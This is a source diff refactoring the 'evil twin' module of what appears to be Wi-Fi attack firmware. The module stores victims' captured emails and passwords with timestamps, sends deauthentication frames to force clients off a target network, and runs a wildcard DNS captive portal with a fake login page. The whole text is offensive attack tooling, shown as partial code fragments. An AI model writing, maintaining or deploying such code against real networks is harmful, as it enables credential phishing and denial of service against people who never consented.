@@ -6,13 +6,8 @@ IPAddress EVIL_TWIN_SUBNET(255, 255, 255, 0);
 int evilTwinVictimCount = 0;
 
 void evilTwinSaveCreds(String email, String password) {
-	if (!lfsBegin()) return;
-
-	File f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_APPEND);
-	if (!f) {
-		f = LittleFS.open(EVIL_TWIN_CREDS_FILE, FILE_WRITE);
-		if (!f) return;
-	}
+	File f = Storage::open(EVIL_TWIN_CREDS_FILE, "a", true);
+	if (!f) return;
 
 	DeviceTime dt = deviceGetTime();
 	char timeBuf[16];
@@ -30,7 +25,7 @@ void evilTwinSaveCreds(String email, String password) {
 
 // evilTwinSendDeauthFrame — thin wrapper kept for local readability
 static void evilTwinSendDeauthFrame(const uint8_t* bssid, int chan) {
-	deauthSendFrame(bssid, chan);
+	Wifi::deauthSendFrame(bssid, chan);
 }
 
 // Shared captive portal detection endpoints (same as evil portal)
@@ -100,12 +95,7 @@ static void _evilTwinServeFsFile(const String& uri, const String& htmlPath, bool
 		}
 	}
 
-	File f;
-	#if HAS_SD
-		f = useSd ? SD.open(path) : LittleFS.open(path);
-	#else
-		f = LittleFS.open(path);
-	#endif
+	File f = Storage::open(path.c_str(), "r", !useSd);
 	if (f) {
 		webServer.streamFile(f, getContentType(path));
 		f.close();
@@ -141,7 +131,7 @@ void evilTwinLoop() {
 		dnsServer.start(53, "*", EVIL_TWIN_GATEWAY);
 
 		// Init deauth frame
-		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+		Wifi::deauthResetFrame();
 
 		_evilTwinRegisterCaptiveEndpoints();
 		_evilTwinRegisterLogin();
